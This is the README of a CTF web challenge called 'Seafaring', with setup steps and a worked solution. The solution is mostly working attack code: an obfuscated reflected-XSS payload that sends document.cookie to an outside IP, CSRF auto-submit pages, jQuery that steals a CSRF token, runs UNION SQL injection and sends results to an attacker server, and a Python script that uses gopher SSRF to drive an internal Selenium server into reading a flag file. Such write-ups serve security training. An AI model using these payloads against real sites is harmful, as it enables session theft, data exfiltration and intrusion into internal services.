# Seafaring

Life at least two impulses, a time for a love regardless of personal danger, go to travel.

## Tag

- XSS
- CSRF
- SQLi
- SSRF
- Selenium Server

## Usage

If you want to build this web for yourself, you should  update the file `check.py`

```python
admin_url = 'http://ctf.momomoxiaoxi.com:9999/admin/index.php'
login_url = 'http://ctf.momomoxiaoxi.com:9999/login.php'
driver_url = 'http://selenium-firefox:4444/wd/hub'
```

```
docker-compose build
docker-compose up -d
```

## Solution

#### SEAFARING1

1. The first vulnerability is that the programmer's die() function is improper, causing information to leak.

   so,  you can get js from this ,`curl http://ctf.momomoxiaoxi.com:9999/admin/index.php`

2. There is a reflective XSS in handle_message.php.

   payload:

   ```http
   POST /admin/handle_message.php HTTP/1.1
   Host: ctf.momomoxiaoxi.com
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
   Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 269
   Cookie: PHPSESSID=kbg91rh9u9gvpkcjt9im1tgse4
   DNT: 1
   Connection: close
   Upgrade-Insecure-Requests: 1
   
   action=view_unreads&status=1&token=d096148ee0d3cf1'<svg onload='img = new Image(); img.src=String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 50, 48, 50, 46, 49, 49, 50, 46, 53, 49, 46, 49, 51, 48, 58, 57, 48, 57, 48, 47, 63, 122, 61).concat(btoa(document.cookie));'>'
   ```

   There is a message function in the entire site, the admin will check the user's message in turn, and click on the http address inside.

   So, you can use this payload to stolen cookie.

   ```html
   <html>
     <!-- CSRF PoC - generated by Burp Suite Professional -->
     <body onload="document.forms[0].submit()">
     <script>history.pushState('', '', '/')</script>
       <form action="http://ctf.momomoxiaoxi.com/admin/handle_message.php" method="POST">
         <input type="hidden" name="action" value="view&#95;unreads" />
         <input type="hidden" name="status" value="1" />
         <input type="hidden" name="token" value="d096148ee0d3cf1&apos;&lt;svg&#32;onload&#61;&apos;img&#32;&#61;&#32;new&#32;Image&#40;&#41;&#59;&#32;img&#46;src&#61;String&#46;fromCharCode&#40;104&#44;&#32;116&#44;&#32;116&#44;&#32;112&#44;&#32;58&#44;&#32;47&#44;&#32;47&#44;&#32;50&#44;&#32;48&#44;&#32;50&#44;&#32;46&#44;&#32;49&#44;&#32;49&#44;&#32;50&#44;&#32;46&#44;&#32;53&#44;&#32;49&#44;&#32;46&#44;&#32;49&#44;&#32;51&#44;&#32;48&#44;&#32;58&#44;&#32;57&#44;&#32;48&#44;&#32;57&#44;&#32;48&#44;&#32;47&#44;&#32;63&#44;&#32;122&#44;&#32;61&#41;&#46;concat&#40;btoa&#40;document&#46;cookie&#41;&#41;&#59;&apos;&gt;&apos;" />
         <input type="submit" value="Submit request" />
       </form>
     </body>
   </html>
   ```

   The next step is SQL injection.

   Although the programmer has all the parameters for real_escape_string, the digital injection can be injected directly.

   Another difficulty here is that all interactions with handle_message exist with csrftoken. Therefore, we need to steal the csrftoken in some way before we can inject.

   In addition, in order to ensure that the same-origin policy is not violated, we cannot steal the token data directly from the iframe on our own third-party page. (unless the victim server misconfigured the CORS policy)

   So, the general way is to load a js through xss, then js to get the token, and then submit. This allows attacks to be made without violating the same-origin policy.

   ```http
   POST /admin/handle_message.php HTTP/1.1
   Host: dbseafaring.xctf.org.cn:9999
   User-Agent: Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
   Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 450
   Cookie: PHPSESSID=as10gmvdfn6k2fu7i40e76qeq2
   DNT: 1
   Connection: close
   Upgrade-Insecure-Requests: 1
   Cache-Control: max-age=0
   
   token=111'<svg onload='var myScript= document.createElement(String.fromCharCode(115, 99, 114, 105, 112, 116));myScript.type=String.fromCharCode(32, 116, 101, 120, 116, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116);myScript.src=String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 111, 106, 46, 109, 111, 109, 111, 109, 111, 120, 105, 97, 111, 120, 105, 46, 99, 111, 109, 47, 101, 120, 112, 49, 46, 106, 115);document.body.appendChild(myScript);'>
   
   ```

   ```html
   <html>
     <!-- CSRF PoC - generated by Burp Suite Professional -->
     <body onload="document.forms[0].submit()">
     <script>history.pushState('', '', '/')</script>
       <form action="http://seafaring.xctf.org.cn:9999/admin/handle_message.php" method="POST">
         <input type="hidden" name="token" value="111&apos;&lt;svg&#32;onload&#61;&apos;var&#32;myScript&#61;&#32;document&#46;createElement&#40;String&#46;fromCharCode&#40;115&#44;&#32;99&#44;&#32;114&#44;&#32;105&#44;&#32;112&#44;&#32;116&#41;&#41;&#59;myScript&#46;type&#61;String&#46;fromCharCode&#40;32&#44;&#32;116&#44;&#32;101&#44;&#32;120&#44;&#32;116&#44;&#32;47&#44;&#32;106&#44;&#32;97&#44;&#32;118&#44;&#32;97&#44;&#32;115&#44;&#32;99&#44;&#32;114&#44;&#32;105&#44;&#32;112&#44;&#32;116&#41;&#59;myScript&#46;src&#61;String&#46;fromCharCode&#40;104&#44;&#32;116&#44;&#32;116&#44;&#32;112&#44;&#32;58&#44;&#32;47&#44;&#32;47&#44;&#32;111&#44;&#32;106&#44;&#32;46&#44;&#32;109&#44;&#32;111&#44;&#32;109&#44;&#32;111&#44;&#32;109&#44;&#32;111&#44;&#32;120&#44;&#32;105&#44;&#32;97&#44;&#32;111&#44;&#32;120&#44;&#32;105&#44;&#32;46&#44;&#32;99&#44;&#32;111&#44;&#32;109&#44;&#32;47&#44;&#32;101&#44;&#32;120&#44;&#32;112&#44;&#32;49&#44;&#32;46&#44;&#32;106&#44;&#32;115&#41;&#59;document&#46;body&#46;appendChild&#40;myScript&#41;&#59;&apos;&gt;" />
         <input type="submit" value="Submit request" />
       </form>
     </body>
   </html>
   ```

   ```js
   #jquery code
   frameOnload = function () {
       var token = window.frames[0].window.csrf_token;
       var status = '-1 union select flllllag,2,3,4 from f111111ag -- ';
       view_unreads(token, status)
   };
   function view_unreads(csrf_token, status) {
       $.ajax({
           type: "POST",
           url: "/admin/handle_message.php",
           data: {"token": csrf_token, "action": "view_unreads", "status": status},
           dataType: "json",
           success: function (data) {
               if (!data["error"]) {
                   data = data['result'];
                   send_secret(data);
               }
               else  send_secret(data["error"]);
           }
       });
   }
   
   function send_secret(data){
       var url = 'http://oj.momomoxiaoxi.com:9090'
       $.get(url, {'key1':data});
   }
   var iframe = document.createElement('iframe');
   iframe.src = "http://ctf.momomoxiaoxi.com/admin/index.php";
   iframe.onload = frameOnload;
   document.body.appendChild(iframe);
   ```


#### SEAFARING2

From SEAFARING1 , we will have a message after logging in to admin.

```
I will tell you a secret path for web2:/admin/m0st_Secret.php! :)
```

At this point, we have a sql injection available. Therefore, you can use the load_file to read the source code directly. When reading, be careful not to use single quotes, so you need hexadecimal encoding. (Because there is no quotes, there is no way to dumpfile)

Payload:

```js
frameOnload = function () {
    var token = window.frames[0].window.csrf_token;
// var status ='-1 union select 1,2,3,4 -- ';
    var status = '-1 union select load_file(0x2f7661722f7777772f68746d6c2f61646d696e2f6d3073745f5365637265742e706870),2,3,4 -- ';
    view_unreads(token, status);

};


function view_unreads(csrf_token, status) {
    $.ajax({
        type: "POST",
        url: "/admin/handle_message.php",
        data: {"token": csrf_token, "action": "view_unreads", "status": status},
        dataType: "json",
        success: function (data) {
            send_secret(data["result"],data["error"]);

        }
    });
}

function send_secret(data,error){
    var url = 'http://oj.momomoxiaoxi.com:9090'
    $.get(url, {'result':data,'error':error});
}

var iframe = document.createElement('iframe');
iframe.src = "http://seafaring.xctf.org.cn:9999/admin/index.php";
iframe.onload = frameOnload;
document.body.appendChild(iframe);
```

Obviously, next step is SSRF , combined with the docker address mechanism, is easy to find that there is still a machine in front, directly scanning the port, you can see that there is a selenium Server on port 4444.

EXP:

```python
# coding:utf-8
import requests
import json
import os
import urllib
import base64

BASE_DIR = (os.path.dirname(os.path.realpath(__file__)))
base_url = "http://seafaring.xctf.org.cn:9999"
session = requests.Session()
proxies = {
	#"http": "http://127.0.0.1:8080"
	}


def encode(origin):
    """ SSRF HTTP 编码 :param origin: :return: """
    tmp = urllib.quote(origin)
    # print tmp
    new = tmp.replace('%0A', '%0D%0A')
    # print new
    result = '_' + urllib.quote(new)
    result = "gopher://172.20.0.2:4444/" + result
    # print result
    return result


def read_file(filename):
    filename = BASE_DIR + '/exp2/' + filename
    with open(filename, 'r') as f:
        data = f.read()
    return data


def get_session():
    payload = read_file('1')
    # print(payload)
    payload = encode(payload)
    print('Payload1 start...\n\n')
    print(payload)
    print('Payload1 end...\n\n')
    session = requests.Session()
    paramsPost = {
        "You_cann0t_guu3s_1t_1s2xs": "gopher://172.20.0.2:4444/_POST%20/wd/hub/session%20HTTP/1.1%0D%0AHost%3A%20172.20.0.2%3A4444%0D%0AConnection%3A%20close%0D%0AAccept%3A%20application/json%3B%20charset%3Dutf-8%0D%0AUser-Agent%3A%20Mozilla/5.0%20%28Android%209.0%3B%20Mobile%3B%20rv%3A61.0%29%20Gecko/61.0%20Firefox/61.0%0D%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.8%2Cen-US%3Bq%3D0.5%2Cen%3Bq%3D0.3%0D%0ADNT%3A%201%0D%0AReferer%3A%20http%3A//172.20.0.2%3A4444/wd/hub/static/resource/hub.html%0D%0AContent-Type%3A%20text/plain%3Bcharset%3DUTF-8%0D%0AContent-Length%3A%2049%0D%0A%0D%0A%7B%22desiredCapabilities%22%3A%7B%22browserName%22%3A%22firefox%22%7D%7D"}
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0",
               "Connection": "close", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "DNT": "1",
               "Content-Type": "application/x-www-form-urlencoded"}
    response = session.post(base_url + "/admin/m0st_Secret.php", data=paramsPost,
                            headers=headers, proxies=proxies)
    print("Status code: %i" % response.status_code)
    print("Response body: %s" % response.content)
    data = response.content.split('"sessionId": "')[1].split('",')[0]
    return data


def load_scripts(id):
    payload = read_file('2')
    payload = payload.replace('{session_id}', id)
    payload = encode(payload)
    print('Payload2 start...\n\n')
    print(payload)
    print('Payload2 end...\n\n')
    session = requests.Session()
    paramsPost = {
        "You_cann0t_guu3s_1t_1s2xs": "gopher://172.20.0.2:4444/_POST%20/wd/hub/session/{session_id}/url%20HTTP/1.1%0D%0AHost%3A%20172.20.0.2%3A4444%0D%0AConnection%3A%20close%0D%0AAccept%3A%20application/json%3B%20charset%3Dutf-8%0D%0AUser-Agent%3A%20Mozilla/5.0%20%28Android%209.0%3B%20Mobile%3B%20rv%3A61.0%29%20Gecko/61.0%20Firefox/61.0%0D%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.8%2Cen-US%3Bq%3D0.5%2Cen%3Bq%3D0.3%0D%0ADNT%3A%201%0D%0AReferer%3A%20http%3A//172.20.0.2%3A4444/wd/hub/static/resource/hub.html%0D%0AContent-Type%3A%20text/plain%3Bcharset%3DUTF-8%0D%0AContent-Length%3A%20142%0D%0A%0D%0A%7B%22url%22%3A%22file%3A///Th3_MosT_S3cR3T_fLag%3Fwdsid%3D{session_id}%26wdurl%3Dhttp%253A%252F%252F172.20.0.2%253A4444%252Fwd%252Fhub%22%7D000000000000000000000".format(session_id=id)}
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0",
               "Connection": "close", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "DNT": "1",
               "Content-Type": "application/x-www-form-urlencoded"}
    response = session.post(base_url+"/admin/m0st_Secret.php", data=paramsPost,
                            headers=headers)
    assert response.status_code==200
    print("Status code: %i" % response.status_code)
    print("Response body: %s" % response.content)


def get_screenshot(id):
    payload = read_file('3')
    payload = payload.replace('{session_id}', id)
    payload = encode(payload)
    print('Payload3 start...\n\n')
    print(payload)
    print('Payload3 end...\n\n')
    session = requests.Session()
    paramsPost = {
        "You_cann0t_guu3s_1t_1s2xs": "gopher://172.20.0.2:4444/_GET%20/wd/hub/session/{}/screenshot%20HTTP/1.1%0D%0AHost%3A%20172.20.0.2%3A4444%0D%0AConnection%3A%20close%0D%0AAccept%3A%20application/json%3B%20charset%3Dutf-8%0D%0AUser-Agent%3A%20Mozilla/5.0%20%28Android%209.0%3B%20Mobile%3B%20rv%3A61.0%29%20Gecko/61.0%20Firefox/61.0%0D%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.8%2Cen-US%3Bq%3D0.5%2Cen%3Bq%3D0.3%0D%0ADNT%3A%201%0D%0AReferer%3A%20http%3A//172.20.0.2%3A4444/wd/hub/static/resource/hub.html%0D%0A%0D%0A".format(id)}
    headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
               "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Android 9.0; Mobile; rv:61.0) Gecko/61.0 Firefox/61.0",
               "Connection": "close", "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3", "DNT": "1",
               "Content-Type": "application/x-www-form-urlencoded"}
    cookies = {"PHPSESSID": "as10gmvdfn6k2fu7i40e76qeq2"}
    response = session.post(base_url+"/admin/m0st_Secret.php", data=paramsPost,
                            headers=headers, cookies=cookies)
    assert response.status_code == 200
    print(response.content)
    results = response.content.split('Server: Jetty(9.4.z-SNAPSHOT)')[1].strip()
    data = json.loads(results)
    png_data = base64.b64decode(data['value'])
    with open(BASE_DIR + '/results.png', 'w') as f:
        f.write(png_data)
    return data


if __name__ == '__main__':
    session_id = get_session()
    load_scripts(session_id)
    get_screenshot(session_id)

```



## Write Ups

- http://momomoxiaoxi.com/ctf/2018/12/01/BCTF2018seafaring/